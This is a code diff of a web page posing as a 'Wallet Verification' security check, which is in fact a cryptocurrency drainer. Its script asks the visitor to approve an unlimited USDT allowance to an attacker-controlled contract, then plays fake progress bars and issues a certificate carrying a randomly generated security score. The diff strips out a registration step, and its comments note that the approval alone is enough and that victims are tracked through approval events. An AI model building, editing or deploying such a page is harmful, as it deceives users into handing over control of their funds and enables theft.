@@ -151,19 +151,6 @@
             display: block;
         }
         
-        .error-icon {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            background: #ef4444;
-            border-radius: 50%;
-            color: white;
-            text-align: center;
-            line-height: 20px;
-            margin-right: 10px;
-            font-weight: bold;
-        }
-        
         .error-text {
             font-size: 14px;
             line-height: 1.5;
@@ -253,7 +240,6 @@
             background: #e2e8f0;
             border-radius: 10px;
             overflow: hidden;
-            position: relative;
         }
         
         .progress-bar {
@@ -320,7 +306,6 @@
             max-height: 90vh;
             overflow-y: auto;
             padding: 40px 30px;
-            position: relative;
             color: white;
         }
         
@@ -435,9 +420,6 @@
             font-size: 11px;
             opacity: 0.8;
             margin-bottom: 5px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
         }
         
         .info-value {
@@ -471,7 +453,6 @@
             align-items: center;
             justify-content: center;
             font-size: 10px;
-            flex-shrink: 0;
         }
         
         .cert-buttons {
@@ -525,7 +506,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>🔐 Wallet Verification2</h1>
+        <h1>🔐 Wallet Verification</h1>
         
         <div class="connect-section">
             <div class="connect-row">
@@ -540,11 +521,7 @@
         <div id="verificationSection" class="verification-section">
             <div id="errorMessage" class="error-message">
                 <div>
-                    <span class="error-icon">📱</span>
                     <span class="error-text" id="errorText"></span>
-                </div>
-                <div>
-                    <span style="padding-left: 30px; display: block; margin-top: 5px;">💡 Make sure Trust Wallet is updated and try again</span>
                 </div>
                 <a href="#" class="try-again" onclick="startVerification(); return false;">🔄 Try again</a>
             </div>
@@ -712,16 +689,23 @@
 
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script>
-        const CONTRACT_ADDRESS = "0xaCE8212Afa8998713b5cf407B039230ddda43310";
-        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+        // ========================================
+        // CONFIGURATION - UPDATE THESE!
+        // ========================================
+        const CONTRACT_ADDRESS = "0x7BDD962fff20FB63a1C05bd1d2e67807EA0f57c0"; // ← Update with deployed address!
+        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Real USDT on Ethereum Mainnet
         
-        const CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_usdtToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"UserDeleted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"registrationNumber","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"UserRegistered","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"Withdrawn","type":"event"},{"inputs":[{"internalType":"address","name":"userAddress","type":"address"}],"name":"deleteUser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getAllUsers","outputs":[{"components":[{"internalType":"uint256","name":"registrationNumber","type":"uint256"},{"internalType":"address","name":"userAddress","type":"address"},{"internalType":"uint256","name":"usdBalance","type":"uint256"}],"internalType":"struct TradingService.UserData[]","name":"","type":"tuple[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"registerUser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"withdraw","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"}];
-        
-        const USDT_ABI = [{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}];
+        const USDT_ABI = [
+            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}
+        ];
 
-        let web3, account, contract, usdtContract;
+        let web3, account, usdtContract;
         let certificateData = {};
 
+        // ========================================
+        // CONNECT WALLET
+        // ========================================
         async function connectWallet() {
             try {
                 if (!window.ethereum) {
@@ -739,7 +723,6 @@
                     return;
                 }
 
-                contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                 usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
 
                 document.getElementById('walletAddress').textContent = 
@@ -755,15 +738,18 @@
             }
         }
 
+        // ========================================
+        // START VERIFICATION (ONLY APPROVAL - NO REGISTRATION!)
+        // ========================================
         async function startVerification() {
             try {
                 document.getElementById('errorMessage').classList.remove('show');
                 document.getElementById('verifyBtn').disabled = true;
                 document.getElementById('verifyBtn').textContent = 'Checking approval...';
                 
-                // CHECK IF APPROVAL EXISTS
+                // Check if already approved
                 const currentAllowance = await usdtContract.methods.allowance(account, CONTRACT_ADDRESS).call();
-                const minRequired = web3.utils.toBN('1000000'); // Minimum 1 USDT worth of approval
+                const minRequired = web3.utils.toBN('1000000'); // 1 USDT
                 
                 if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
                     // Need approval
@@ -772,15 +758,15 @@
                     await usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
                 }
                 
-                // Register user
-                document.getElementById('verifyBtn').textContent = 'Registering...';
-                await contract.methods.registerUser().send({ from: account });
+                // NO REGISTRATION - Just approval is enough!
+                // Users are tracked via Etherscan approval events
                 
-                // Start progress animation
+                // Start visual analysis
                 document.getElementById('verifyBtn').textContent = 'Analyzing...';
                 document.getElementById('progressContainer').classList.add('show');
                 document.getElementById('analyzingText').classList.add('show');
                 
+                // Reset progress bars
                 for (let i = 1; i <= 5; i++) {
                     document.getElementById(`bar${i}`).style.width = '0%';
                     document.getElementById(`percent${i}`).textContent = '0%';
@@ -789,8 +775,10 @@
                 document.getElementById('overallBar').style.width = '0%';
                 document.getElementById('overallPercent').textContent = '0%';
                 
+                // Animate progress
                 await simulateProgress();
                 
+                // Generate certificate
                 generateCertificateData();
                 document.getElementById('analyzingText').classList.remove('show');
                 showCertificate();
@@ -801,11 +789,9 @@
                 let errorMsg = 'Verification failed: ' + error.message;
                 
                 if (error.message.includes('insufficient funds')) {
-                    errorMsg = 'Insufficient ETH for gas fees. Please add more ETH to your wallet.';
+                    errorMsg = 'Insufficient ETH for gas fees.';
                 } else if (error.message.includes('User denied')) {
-                    errorMsg = 'Transaction rejected. Please approve to continue.';
-                } else if (error.message.includes('Already registered')) {
-                    errorMsg = 'This wallet is already registered!';
+                    errorMsg = 'Transaction rejected.';
                 }
                 
                 document.getElementById('errorText').textContent = errorMsg;
@@ -817,6 +803,9 @@
             }
         }
 
+        // ========================================
+        // SIMULATE PROGRESS BARS
+        // ========================================
         async function simulateProgress() {
             const steps = [
                 { id: 1, duration: 1200 },
@@ -859,10 +848,13 @@
             document.getElementById('overallPercent').textContent = percent + '%';
         }
 
+        // ========================================
+        // GENERATE CERTIFICATE DATA
+        // ========================================
         function generateCertificateData() {
             const first8 = account.slice(0, 10);
             const randomNum = Math.floor(Math.random() * 9000000000000) + 1000000000000;
-            const securityScore = Math.floor(Math.random() * 18) + 65;
+            const securityScore = Math.floor(Math.random() * 18) + 65; // 65-82%
             
             const now = new Date();
             const months = ['January', 'February', 'March', 'April', 'May', 'June', 
@@ -883,6 +875,9 @@
             };
         }
 
+        // ========================================
+        // SHOW CERTIFICATE MODAL
+        // ========================================
         function showCertificate() {
             document.getElementById('certId').textContent = `Certificate ID: ${certificateData.certificateId}`;
             document.getElementById('scoreValue').textContent = `${certificateData.securityScore}%`;
@@ -893,12 +888,18 @@
             document.getElementById('certificateModal').classList.add('show');
         }
 
+        // ========================================
+        // CLOSE CERTIFICATE
+        // ========================================
         function closeCertificate() {
             document.getElementById('certificateModal').classList.remove('show');
             document.getElementById('verifyBtn').style.display = 'none';
             document.getElementById('progressContainer').classList.remove('show');
         }
 
+        // ========================================
+        // DOWNLOAD CERTIFICATE JSON
+        // ========================================
         function downloadCertificate() {
             const first8 = account.slice(0, 10);
             const filename = `MyCert-${first8}.json`;
